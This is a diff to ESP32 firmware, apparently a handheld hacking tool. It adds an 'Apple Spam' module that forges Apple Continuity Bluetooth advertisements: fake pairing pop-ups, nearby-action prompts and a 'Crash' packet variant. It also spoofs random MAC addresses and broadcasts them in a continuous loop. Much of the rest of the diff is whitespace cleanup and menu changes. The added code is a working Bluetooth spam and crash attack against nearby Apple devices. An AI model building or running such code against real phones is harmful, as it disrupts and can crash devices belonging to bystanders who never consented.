@@ -38,6 +38,69 @@ struct Station {
 
 enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };
 
+// ── GhostESP Apple Spam ──────────────────────────────────────────────────────
+#define ContinuityTypeProximityPair 0x07
+#define ContinuityTypeNearbyAction  0x0F
+#define ContinuityTypeCustomCrash   0xFF
+
+static const uint16_t apple_models[] = {
+    0x0E20, 0x0A20, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420,
+    0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920,
+    0x1720, 0x1220, 0x1620
+};
+#define APPLE_MODEL_COUNT (sizeof(apple_models) / sizeof(apple_models[0]))
+
+static const uint8_t apple_actions[] = {
+    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B
+};
+#define APPLE_ACTION_COUNT (sizeof(apple_actions) / sizeof(apple_actions[0]))
+
+static bool apple_spam_running = false;
+
+static size_t build_proximity_pair(uint8_t *buf) {
+    uint16_t model = apple_models[esp_random() % APPLE_MODEL_COUNT];
+    uint8_t prefix = (model == 0x0055 || model == 0x0030) ? 0x05 : ((esp_random() % 2) ? 0x07 : 0x01);
+    uint8_t color  = esp_random() % 16;
+    uint8_t i = 0;
+    buf[i++] = 30; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
+    buf[i++] = ContinuityTypeProximityPair; buf[i++] = 25;
+    buf[i++] = prefix;
+    buf[i++] = (model >> 8) & 0xFF; buf[i++] = model & 0xFF;
+    buf[i++] = 0x55;
+    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10);
+    buf[i++] = ((esp_random() % 8)  << 4) | (esp_random() % 10);
+    buf[i++] = esp_random() & 0xFF; buf[i++] = color; buf[i++] = 0x00;
+    esp_fill_random(&buf[i], 16); i += 16;
+    return i;
+}
+
+static size_t build_nearby_action(uint8_t *buf) {
+    uint8_t action = apple_actions[esp_random() % APPLE_ACTION_COUNT];
+    uint8_t flags  = 0xC0;
+    if (action == 0x20 && (esp_random() % 2)) flags--;
+    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;
+    uint8_t i = 0;
+    buf[i++] = 10; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
+    buf[i++] = ContinuityTypeNearbyAction; buf[i++] = 5;
+    buf[i++] = flags; buf[i++] = action;
+    esp_fill_random(&buf[i], 3); i += 3;
+    return i;
+}
+
+static size_t build_custom_crash(uint8_t *buf) {
+    uint8_t action = apple_actions[esp_random() % APPLE_ACTION_COUNT];
+    uint8_t i = 0;
+    buf[i++] = 16; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
+    buf[i++] = ContinuityTypeNearbyAction; buf[i++] = 5;
+    buf[i++] = 0xC0; buf[i++] = action;
+    esp_fill_random(&buf[i], 3); i += 3;
+    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x10;
+    esp_fill_random(&buf[i], 3); i += 3;
+    return i;
+}
+// ─────────────────────────────────────────────────────────────────────────────
+
+
 const uint8_t IOS1[] = {
     0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b,
     0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12,
@@ -237,7 +300,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
 }
 
 void executeSpam(EBLEPayloadType type) {
-    
+
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
@@ -346,20 +409,20 @@ void aj_adv(int ble_choice) {
     int count = 0;
     String spamName = "";
     if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }
-    
+
     if (ble_choice == 5) {
         displayTextLine("Spam All Sequential");
         padprintln("");
         padprintln("Press ESC to stop");
-        
+
         while (1) {
             if (check(EscPress)) {
                 returnToMenu = true;
                 break;
             }
-            
+
             int protocol = count % 7;
-            
+
             switch(protocol) {
                 case 0:
                     displayTextLine("Android " + String(count));
@@ -390,15 +453,15 @@ void aj_adv(int ble_choice) {
                     executeSpam(AppleJuice);
                     break;
             }
-            
+
             count++;
-            
+
             if (check(EscPress)) {
                 returnToMenu = true;
                 break;
             }
         }
-        
+
         BLEDevice::init("");
         vTaskDelay(100 / portTICK_PERIOD_MS);
         pAdvertising = nullptr;
@@ -410,14 +473,14 @@ void aj_adv(int ble_choice) {
 #endif
         return;
     }
-    
+
     while (1) {
         switch (ble_choice) {
             case 0:
-                startAppleSpam(0);
+                startAppleSpamAll();
                 return;
             case 1:
-                startAppleSpam(10);
+                startAppleSpamAll();
                 return;
             case 2:
                 displayTextLine("SwiftPair  (" + String(count) + ")");
@@ -464,26 +527,111 @@ void aj_adv(int ble_choice) {
 
 void legacySubMenu() {
     std::vector<Option> legacyOptions;
-    
     legacyOptions.push_back({"SourApple", []() { aj_adv(7); }});
     legacyOptions.push_back({"AppleJuice", []() { aj_adv(8); }});
-    
-    
     legacyOptions.push_back({"Back", []() { returnToMenu = true; }});
-    
     loopOptions(legacyOptions, MENU_TYPE_SUBMENU, "Apple Spam (Legacy)");
+}
+
+void startAppleSpamAll() {
+    apple_spam_running = true;
+
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
+
+    BLEDevice::init("");
+    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
+
+    drawMainBorderWithTitle("Apple Spam");
+    padprintln("");
+    padprintln("Randomized Cycle ");
+    padprintln("Press ESC to stop");
+
+    while (apple_spam_running) {
+        if (check(EscPress)) {
+            apple_spam_running = false;
+            returnToMenu = true;
+            break;
+        }
+        uint8_t packet[32];
+        size_t  len = 0;
+        int     r   = esp_random() % 3;
+        const char* type_name = "";
+        if      (r == 0) { len = build_proximity_pair(packet); type_name = "Pairing"; }
+        else if (r == 1) { len = build_nearby_action(packet);  type_name = "Action";  }
+        else             { len = build_custom_crash(packet);   type_name = "Crash";   }
+
+        displayTextLine(String(type_name) + " " + String(millis() / 1000) + "s");
+
+        BLEAdvertisementData advData;
+        advData.setFlags(0x06);
+#ifdef NIMBLE_V2_PLUS
+        advData.addData(packet, len);
+#else
+        std::vector<uint8_t> v(packet, packet + len);
+        advData.addData(v);
+#endif
+        pAdv->setAdvertisementData(advData);
+        pAdv->start();
+        vTaskDelay(150 / portTICK_PERIOD_MS);
+        pAdv->stop();
+        vTaskDelay(50  / portTICK_PERIOD_MS);
+    }
+#if defined(CONFIG_IDF_TARGET_ESP32C5)
+    esp_bt_controller_deinit();
+#else
+    BLEDevice::deinit();
+#endif
+}
+
+void quickAppleSpam(int payloadIndex) {
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
+    BLEDevice::init("");
+    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
+    uint8_t packet[32]; size_t len = 0;
+    int r = esp_random() % 2;
+    if (r == 0) len = build_proximity_pair(packet);
+    else        len = build_nearby_action(packet);
+    BLEAdvertisementData advData;
+    advData.setFlags(0x06);
+#ifdef NIMBLE_V2_PLUS
+    advData.addData(packet, len);
+#else
+    std::vector<uint8_t> v(packet, packet + len);
+    advData.addData(v);
+#endif
+    pAdv->setAdvertisementData(advData);
+    pAdv->start();
+    vTaskDelay(100 / portTICK_PERIOD_MS);
+    pAdv->stop();
+    vTaskDelay(5   / portTICK_PERIOD_MS);
+#if defined(CONFIG_IDF_TARGET_ESP32C5)
+    esp_bt_controller_deinit();
+#else
+    BLEDevice::deinit();
+#endif
+}
+
+void appleSubMenu() {
+    std::vector<Option> appleOptions;
+    appleOptions.push_back({"Spam All ", []() { startAppleSpamAll(); }});
+    appleOptions.push_back({"Apple Spam (Legacy)", []() { legacySubMenu(); }});
+    appleOptions.push_back({"Back", []() { returnToMenu = true; }});
+    loopOptions(appleOptions, MENU_TYPE_SUBMENU, "Apple Spam");
 }
 void spamMenu() {
     std::vector<Option> options;
 
     options.push_back({"Apple Spam", [=]() { appleSubMenu(); }});
-    options.push_back({"Apple Spam (Legacy)", [=]() { legacySubMenu(); }});
     options.push_back({"Windows Spam", lambdaHelper(aj_adv, 2)});
     options.push_back({"Samsung Spam", lambdaHelper(aj_adv, 3)});
     options.push_back({"Android Spam", lambdaHelper(aj_adv, 4)});
     options.push_back({"Spam All", lambdaHelper(aj_adv, 5)});
     options.push_back({"Spam Custom", lambdaHelper(aj_adv, 6)});
     options.push_back({"Back", []() { returnToMenu = true; }});
-     
+
     loopOptions(options, MENU_TYPE_SUBMENU, "Bluetooth Spam");
 }
